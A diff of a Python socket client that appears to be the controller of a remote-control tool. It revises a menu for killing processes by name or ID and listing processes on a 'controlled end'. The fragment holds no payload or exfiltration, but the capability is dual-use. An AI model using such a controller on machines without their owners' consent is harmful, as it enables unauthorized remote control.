@@ -6,7 +6,7 @@ import socket
 import connect
 import time
 
-# 变量定义
+# 变量定义 ACTIVE 是否主动连接被控端
 ACTIVE = 1
 
 #文字颜色
@@ -100,7 +100,7 @@ def Process(sock):
         print('\033[0;32;48m[+]\033[0m More Info:')
         print('[1] Kill by Name (Only for Win)')
         print('[2] Kill by ID')
-        print('[3] USB Info')
+        print('[3] Process List')
         print('[0] Exit\n')
         if Processmanage(sock):
             break
@@ -120,20 +120,28 @@ def Processmanage(sock):
                 if Input == 1:
                     sock.send(b'2x01')
                     Input = input('>>> Process Name: ')
+                    Input = Input.encode('utf-8')
+                    sock.send(Input)
                 elif Input == 2:
                     sock.send(b'2x02')
                     Input = input('>>> Process ID: ')
+                    Input = Input.encode('utf-8')
+                    sock.send(Input)
                 elif Input == 3:
-                    sock.send(b'2x03')
-                buffer = []
-                while True:
-                    d = sock.recv(1024)
-                    if d != b'End':
-                        buffer.append(d)
-                    else:
-                        break
-                data = b''.join(buffer)
-                data = data.decode('utf-8')
+                    sock.send(b'2')
+                    buffer = []
+                    while True:
+                        d = sock.recv(1024)
+                        if d != b'End':
+                            buffer.append(d)
+                        else:
+                            break
+                    data = b''.join(buffer)
+                    data = data.decode('utf-8')
+                    print('\n%s\n' % data)
+                    return False
+                d = sock.recv(1024)
+                data = d.decode('utf-8')
                 print('\n%s\n' % data)
                 return False
             else:
